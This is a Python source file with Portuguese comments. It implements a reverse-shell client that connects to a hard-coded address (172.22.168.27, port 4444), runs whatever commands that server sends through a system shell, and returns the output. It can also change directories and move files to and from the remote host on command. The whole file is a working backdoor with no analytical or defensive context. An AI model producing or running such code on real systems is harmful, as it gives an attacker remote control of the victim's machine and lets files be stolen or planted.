import socket
import json
import os
import subprocess

def data_send(data):
    """Envia dados ao servidor."""
    jsondata = json.dumps(data)
    soc.send(jsondata.encode()) 

def data_recv():
    """Recebe dados do servidor."""
    data = ''
    while True:
        try:
            data += soc.recv(1024).decode().rstrip()
            return json.loads(data) 
        except ValueError:
            continue

def download_file(file):
    """Recebe um arquivo do servidor."""
    try:
        with open(file, 'wb') as f:
            soc.settimeout(5)
            while True:
                chunk = soc.recv(1024)
                if not chunk:
                    break
                f.write(chunk)
    finally:
        soc.settimeout(None)

def upload_file(file):
    """Envia um arquivo para o servidor."""
    try:
        with open(file, 'rb') as f:
            while True:
                chunk = f.read(1024)
                if not chunk:
                    break
                soc.send(chunk)
    except FileNotFoundError:
        print(f"[!] Arquivo não encontrado: {file}")

def shell():
    """Executa os comandos recebidos do servidor."""
    while True:
        comm = data_recv()
        if comm == 'exit':
            break
        elif comm == 'clear':
            pass  # Não há necessidade de executar clear no cliente
        elif comm.startswith('cd '):
            try:
                os.chdir(comm[3:])
                data_send(f"[+] Diretório alterado para {os.getcwd()}")
            except FileNotFoundError:
                data_send(f"[!] Diretório não encontrado: {comm[3:]}")
        elif comm.startswith('upload '):
            download_file(comm[7:])
        elif comm.startswith('download '):
            upload_file(comm[9:])
        else:
            try:
                exe = subprocess.Popen(comm, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                rcomm = exe.stdout.read() + exe.stderr.read()
                data_send(rcomm.decode())
            except Exception as e:
                data_send(f"[!] Erro ao executar comando: {e}")

# Configurações do cliente
soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    soc.connect(('172.22.168.27', 4444))
    shell()
except Exception as e:
    print(f"[!] Erro ao conectar ao servidor: {e}")
finally:
    soc.close()
